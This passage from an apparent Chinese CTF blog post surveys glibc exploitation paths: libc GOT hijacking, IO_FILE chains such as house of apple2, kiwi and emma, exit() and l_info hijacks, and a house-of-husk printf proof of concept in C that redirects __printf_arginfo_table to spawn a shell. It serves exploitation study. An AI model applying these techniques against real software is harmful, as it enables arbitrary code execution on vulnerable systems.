class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048 off_1ED048      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; DATA XREF: j___wmemset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068 off_1ED068      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070 off_1ED070      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078 off_1ED078      dq offset __stpcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080 off_1ED080      dq offset __wmemcmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088 off_1ED088      dq offset _dl_find_dso_for_object</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0 off_1ED0B0      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0 off_1ED0C0      dq offset __memrchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0 off_1ED0D0      dq offset __tls_get_addr</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0                                         ; DATA XREF: ___tls_get_addr↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8 off_1ED0D8      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0 off_1ED0F0      dq offset _dl_fatal_printf</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100 off_1ED100      dq offset __wcscpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110 off_1ED110      dq offset __strcasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120 off_1ED120      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128 off_1ED128      dq offset __stpncpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130 off_1ED130      dq offset __wcscmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138 off_1ED138      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150 off_1ED150      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158 off_1ED158      dq offset __new_memcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160 off_1ED160      dq offset _dl_rtld_di_serinfo</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168 off_1ED168      dq offset _dl_allocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168                                         ; DATA XREF: __dl_allocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170 off_1ED170      dq offset __tunable_get_val</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170                                         ; DATA XREF: ___tunable_get_val↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178 off_1ED178      dq offset __wcslen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; DATA XREF: j___wcslen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188 off_1ED188      dq offset __wcsnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198 off_1ED198      dq offset _dl_allocate_tls_init</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 off_1ED1B0      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 _got_plt        ends                    ; Indirect relocation</span><br></pre></td></tr></table></figure><p>可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？</p><p>笔者在glibc2.34的源代码中进行了查找:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string/string.h</span></span><br><span class="line"><span class="comment">/* Return the length of S.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> <span class="title function_">strlen</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__s)</span></span><br><span class="line">     __THROW __attribute_pure__ __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>))</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /sysdeps/alpha/strlen.S</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">ENTRY(<span class="built_in">strlen</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PROF</span></span><br><span class="line">ldgpgp, <span class="number">0</span>(pv)</span><br><span class="line">ldaAT, _mcount</span><br><span class="line">jsrAT, (AT), _mcount</span><br><span class="line">.prologue <span class="number">1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">.prologue <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">ldq_u   t0, <span class="number">0</span>(a0)<span class="meta"># load first quadword (a0 may be misaligned)</span></span><br><span class="line">lda     t1, <span class="number">-1</span>(zero)</span><br><span class="line">insqh   t1, a0, t1</span><br><span class="line">andnot  a0, <span class="number">7</span>, v0</span><br><span class="line">or      t1, t0, t0</span><br><span class="line">nop<span class="meta"># dual issue the next two on ev5</span></span><br><span class="line">cmpbge  zero, t0, t1# t1 &lt;- bitmask: bit i == <span class="number">1</span> &lt;==&gt; i-th byte == <span class="number">0</span></span><br><span class="line">bne     t1, $found</span><br><span class="line"></span><br><span class="line">$loop:ldq     t0, <span class="number">8</span>(v0)</span><br><span class="line">addq    v0, <span class="number">8</span>, v0<span class="meta"># addr += 8</span></span><br><span class="line">cmpbge  zero, t0, t1</span><br><span class="line">beq     t1, $loop</span><br><span class="line"></span><br><span class="line">$found:negq    t1, t2<span class="meta"># clear all but least set bit</span></span><br><span class="line">and     t1, t2, t1</span><br><span class="line"></span><br><span class="line">and     t1, <span class="number">0xf0</span>, t2<span class="meta"># binary search for that set bit</span></span><br><span class="line">andt1, <span class="number">0xcc</span>, t3</span><br><span class="line">andt1, <span class="number">0xaa</span>, t4</span><br><span class="line">cmovnet2, <span class="number">4</span>, t2</span><br><span class="line">cmovnet3, <span class="number">2</span>, t3</span><br><span class="line">cmovnet4, <span class="number">1</span>, t4</span><br><span class="line">addqt2, t3, t2</span><br><span class="line">addqv0, t4, v0</span><br><span class="line">addqv0, t2, v0</span><br><span class="line">nop<span class="meta"># dual issue next two on ev4 and ev5</span></span><br><span class="line"></span><br><span class="line">subq    v0, a0, v0</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">END(<span class="built_in">strlen</span>)</span><br><span class="line">libc_hidden_builtin_def (<span class="built_in">strlen</span>)</span><br></pre></td></tr></table></figure><p>发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。</p><p>笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。</p><p>由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。</p><p>而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。</p><p>同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。</p><p>其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数</p><p>此外，很多字符串相关函数，都会调用got表中的函数，因此可以通过此来劫持。</p><p>不过在最近的比赛中，笔者打算使用libc.got 时，发现高版本libc似乎很多libc got链用不了了。</p><p>同时@kylebot 使用angr挖掘IO_FILE链启发了我，笔者打算写一个用argn挖掘可利用的libc.got的工具  #TODO  稍微鸽一下（</p><h3 id="IO-FILE">IO_FILE</h3><p>在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流</p><ul><li>house of apple 2/house of cat: <code>_IO_wide_data</code><ul><li>主打一个简单方便</li></ul></li><li>house of Lys<ul><li>主要在于，一般而言，用largebin attack进行攻击时，IO_FILE 的头我们是控制不了的，所以house of apple2存在一些不方便的地方。</li><li>而house of Lys和house of apple2一样简单，并且不需要控制head</li></ul></li><li>house of kiwi: <code>_IO_file_jumps</code><ul><li>缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert</li></ul></li><li>house of emma: <code>_IO_cookie_jumps</code><ul><li>需要能控制pointer_guard</li></ul></li></ul><p>如果要找到更多的IO_FILE 链呢？</p><p><a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/#more">可以用angr自动化挖掘IO FILE链接</a></p><h3 id="exit">exit()</h3><p><a href="https://www.anquanke.com/post/id/243196">exit</a> 的流程在这篇blog中已经讲述得很详细了，</p><p>攻击点如下</p><ul><li>__run_exit_handles中的__exit_funcs<ul><li>需要绕过pointer_guard</li></ul></li><li><strong>rtld_global的l_info（指向ELF的Dynamic段）</strong><ul><li>这是一个ld地址，所以和libc的地址可能会有一些不确定的偏移（和版本有关，可以开个对应版本的docker看看）</li><li>虽然Dynamic 段的结构是&lt;idx，偏移&gt;，但其实，l_info 的解析过程中，并不会检测其idx，所以其实只需要伪造偏移就行</li><li>通过控制l_info对应idx可以控制dl_fini的析构，主要是两种： fini_array 和 fini<ul><li>fini_array可以用来控制orw</li><li>fini可以控制到一个函数执行，一般用one_gadget</li></ul></li></ul></li><li>直接修改libc的__libc_atexit节或者elf的fini_array<ul><li>然而一个很现实的问题是这两个东西在高版本都已经不可写了</li></ul></li></ul><h3 id="printf-fmt">printf-fmt</h3><p>这一条链来自house of husk的攻击手法<br>主要是对libc格式化字符串解析过程的攻击。</p><p>先看libc是如何解析格式化字符传，通过跟踪调试可以发现，其解析字符是 <code>printf_positional</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>此函数里面通过 <code>__parse_one_cmb</code> 解析格式化字符串，并将其转换为相应specs结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>而在这个解析函数存在这样一个亮点</p><ul><li>如果<code>__printf_function_table != 0</code></li><li>并且<code>__printf_arginfo_table[spec-&gt;info.spec] != 0</code></li></ul><p>那么就会调用 <code>__printf_arginfo_table[spec-&gt;info.spec]</code><br>这里的info-&gt;spec就是我们的格式化字符(例如’s’, ‘d’)</p><p>查看这两个地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x401000 r--p     1000      0 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x401000           0x402000 r-xp     1000   1000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x402000           0x403000 r--p     1000   2000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x403000           0x404000 r--p     1000   2000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">          0x404000           0x405000 rw-p     1000   3000 /home/nemo/Pwn/workspace/basic_overflow/num</span><br><span class="line">    0x7ffff7dc4000     0x7ffff7dc6000 rw-p     2000      0 [anon_7ffff7dc4]</span><br><span class="line">    0x7ffff7dc6000     0x7ffff7dec000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7dec000     0x7ffff7f49000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f49000     0x7ffff7f96000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f96000     0x7ffff7f9a000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9a000     0x7ffff7f9c000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9c000     0x7ffff7fa6000 rw-p     a000      0 [anon_7ffff7f9c]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__printf_arginfo_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">8 = (printf_arginfo_size_function ***) 0x7ffff7f9b8b0 &lt;__printf_arginfo_table&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p __printf_function_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">9 = (printf_function **) 0x1000</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__printf_function_table</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10 = (printf_function ***) 0x7ffff7f9c9a0 &lt;__printf_function_table&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这两个的地址都是libc地址，如果存在两个libc任意写，就可以实现劫持。</p><p>不过其第一个参数是 spec-&gt;info， info的第一个成员是格式化的输出长度，如果没有指定，就是-1。</p><p>然而，一般程序是不会让你控制输出长度（也就是格式化字符前面的数字），所以并没有什么用处，大概率你是控制不了的，只能打one_gadgat。</p><p>写了个poc验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Init Got&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *libc = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)<span class="number">0x404000</span><span class="number">-0x55c20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Libc: %p\n&quot;</span>, libc);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_arginfo[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_arginfo[<span class="string">&#x27;s&#x27;</span>] = libc + <span class="number">0x4f390</span>; <span class="comment">// system</span></span><br><span class="line">    <span class="comment">//fake_arginfo[&#x27;s&#x27;] = libc + 0xfb41f;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *print_function = libc + <span class="number">0x1d69a0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *print_arginfo = libc + <span class="number">0x1d58b0</span>;</span><br><span class="line"></span><br><span class="line">    *print_arginfo = fake_arginfo;</span><br><span class="line">    *print_function = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: %6845243s&quot;</span>);</span><br><span class="line">    <span class="comment">// u32(b&#x27;;sh\x00&#x27;) = 6845243</span></span><br><span class="line">    <span class="comment">// printf(&quot;Enter a number: %1&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="辅助攻击">辅助攻击</h2><h3 id="tcache-perthread-struct">tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 